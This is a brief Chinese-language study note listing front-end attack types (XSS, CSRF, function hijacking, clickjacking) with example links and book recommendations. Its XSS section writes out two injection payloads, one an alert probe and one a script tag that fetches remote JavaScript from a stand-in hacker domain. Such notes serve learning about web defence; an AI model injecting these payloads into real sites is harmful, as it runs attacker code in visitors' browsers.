## XSS攻击
主要是注入脚本，如论坛里面用户输入`<script>alert();</script>`，页面回显的时候如果没有处理js脚本，就可能造成攻击。angular的$sce就是用来处理XSS攻击的。`<script>$.getScript('http://www.hack.com/index.js');</script>`

## CXRF攻击
[栗子](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)

## 函数劫持
控制台改代码

## XSS与函数劫持
```
$.post();
```

## 界面操作劫持
[栗子](http://blog.csdn.net/c2iekqea/article/details/55684701)


## 书籍

[Web前端黑客技术揭秘](https://item.jd.com/12878817351.html)
[Web前端黑客技术揭秘(视频)](https://ke.qq.com/course/133640)

[白帽子讲Web安全](https://item.jd.com/11483966.html)
[白帽子讲Web扫描](https://item.jd.com/15503446687.html)
